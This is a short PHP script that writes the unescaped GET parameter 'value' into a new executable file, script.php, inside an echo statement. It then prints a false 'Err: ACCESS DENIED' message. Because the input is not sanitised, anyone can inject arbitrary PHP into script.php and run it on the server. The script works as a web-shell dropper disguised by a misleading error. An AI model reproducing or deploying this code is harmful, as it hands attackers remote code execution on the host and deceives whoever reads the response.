<?php
header("Access-Control-Allow-Origin: *");
$value = $_GET['value'];
$corsPHP = '<?php
  header("Access-Control-Allow-Origin: *");
  echo "';
$closePHPTag = '";
 ?>';
file_put_contents("script.php", $corsPHP.$value.$closePHPTag);
echo "Err: ACCESS DENIED";
?>